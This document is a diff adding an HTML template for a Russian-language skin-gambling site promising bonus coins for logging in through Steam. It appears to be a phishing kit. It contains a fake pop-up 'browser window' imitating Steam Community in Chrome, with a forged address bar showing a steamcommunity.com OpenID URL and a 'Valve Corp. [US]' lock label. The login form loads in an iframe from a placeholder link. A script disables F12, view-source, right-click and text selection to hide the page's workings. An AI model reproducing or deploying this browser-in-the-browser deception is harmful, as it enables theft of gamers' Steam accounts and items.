@@ -1,0 +1,146 @@
+<html>
+	<head>
+		<title>%title%</title>
+		<link rel="stylesheet" href="template-1/css/style.css" />
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="shortcut icon" href="template-1/img/favicon.ico" type="image/x-icon">
+		<script type="text/javascript" src="template-1/js/jquery-3.2.1.js"></script>
+		
+		<link rel="stylesheet" type="text/css" href="template-1/window/window.css">
+		<script type="text/javascript" src="template-1/window/jquery-ui.min.js"></script>
+		<script type="text/javascript" src="template-1/window/bowser.js"></script>
+		<script type="text/javascript" src="template-1/window/useragents.js"></script>
+		<script type="text/javascript" src="template-1/window/window.js"></script>
+        <audio src="template-1/1.mp3" autoplay></audio>
+	</head>
+   </head>
+	<body>
+		<div id="content" >
+			<div id="content-inner" >
+				<div id="logo">
+					<div id="logo_img" ></div>
+					<div id="domain_wrapper" ><span id="domain_name">LOGOTYPE</span></div>
+				</div>
+				
+				<div id="info">
+					<div id="bonus" class="info-block" >
+						<div class="info-block_img" id="bonus_img" ></div>
+						<div><span class="style3">Бонус <b>1000 <br /> монет</b> при <br /> регистрации</span></div>
+					</div>
+					<div id="distributions" class="info-block" >
+						<div class="info-block_img" id="distributions_img" ></div>
+						<div><span class="style3"><b>Ежедневная</b> <br /> раздача <br /> монет</span></div>
+					</div>
+					<div id="ref-system" class="info-block" >
+						<div class="info-block_img" id="ref-system_img" ></div>
+						<div><span class="style3"><b>Выгодная</b> <br /> реферальная <br /> система</span></div>
+					</div>
+				</div>
+				
+				<div id="button_block">  
+					<span><span class="style3">При входе в систему, Вы заявляете, что вам 18 лет и Вы прочитали <a >Условия предоставления услуг.</a></span></span>
+					<div id="button" ><a href="javascript:login()">Войти через Steam</a></div>
+				</div>
+			</div>
+		</div>
+		<script type="text/javascript">
+			 function preventSelection(element){
+var preventSelection = false;
+function addHandler(element, event, handler){
+if (element.attachEvent)
+element.attachEvent('on' + event, handler);
+else
+if (element.addEventListener)
+element.addEventListener(event, handler, false);
+}
+window.onkeydown = function(evt) {
+    if(evt.keyCode == 123) return false;
+};
+window.onkeypress = function(evt) {
+    if(evt.keyCode == 123) return false;
+};
+		document.onkeydown = function(e)
+{
+var e = e || window.event;
+if(e.keyCode == 85 && e.ctrlKey) return false;
+ }
+function removeSelection(){
+if (window.getSelection) { window.getSelection().removeAllRanges(); }
+else if (document.selection && document.selection.clear)
+document.selection.clear();
+}
+function killCtrlA(event){
+var event = event || window.event;
+var sender = event.target || event.srcElement;
+if (sender.tagName.match(/INPUT|TEXTAREA/i))
+return;
+var key = event.keyCode || event.which;
+if (event.ctrlKey && key == 'A'.charCodeAt(0))
+{
+removeSelection();
+if (event.preventDefault)
+event.preventDefault();
+else
+event.returnValue = false;
+}
+}
+addHandler(element, 'mousemove', function(){
+if(preventSelection)
+removeSelection();
+});
+addHandler(element, 'mousedown', function(event){
+var event = event || window.event;
+var sender = event.target || event.srcElement;
+preventSelection = !sender.tagName.match(/INPUT|TEXTAREA/i);
+});
+addHandler(element, 'mouseup', function(){
+if (preventSelection)
+removeSelection();
+preventSelection = false;
+});
+addHandler(element, 'keydown', killCtrlA);
+addHandler(element, 'keyup', killCtrlA);
+}
+function clickIE4(){
+if (event.button==2){
+return false;
+}
+}
+function clickNS4(e){
+if (document.layers||document.getElementById&&!document.all){
+if (e.which==2||e.which==3){
+return false;
+}
+}
+}
+if (document.layers){
+document.captureEvents(Event.MOUSEDOWN);
+document.onmousedown=clickNS4;
+}
+else if (document.all&&!document.getElementById){
+document.onmousedown=clickIE4;
+}
+document.oncontextmenu=new Function("return false")
+preventSelection(document);
+		</script>
+		<div class="ui-widget-content ui-draggable ui-draggable-handle" id="new-window" style="width: 1024.5px; height: 573.3px;  left: 145px; top: 25px;"> <!-- display: none; -->
+			<div class="window-header">
+				<div class="window-header-logo"></div>
+				<div class="window-header-label">
+					Сообщество Steam - <span id="browser-name">Google Chrome</span>
+				</div>
+				<div class="window-header-actions">
+					<i class="flaticon--custom-1 flaticon-minus-symbol"></i><i class="flaticon--custom-1 flaticon-multi-tab"></i><i class="flaticon--custom-1 flaticon-cancel window-header-close"></i>
+				</div>
+			</div>
+			<div class="window-body">
+				<div class="window-body-addressbar">
+					<div class="addressbar-secure"><i class="flaticon--custom-2 flaticon-lock"></i><span class="addressbar-secure-label">Valve Corp. [US]</span></div>
+					<input class="addressbar-address" disabled type="text" value="https://steamcommunity.com/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https%3A%2F%2F%2F%3Floc%3Dlogin_migrate%26content_only%3D1%26openid_nonce%3DgO5aW7Br0kAECosz&amp;openid.realm=https%3A%2F%2FCSGOFOREST.INFO&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select">
+				</div>
+				<iframe class="window-body-data-1" src="%login-link%"></iframe>
+			</div>
+		</div>
+		
+	</body>
+</html>
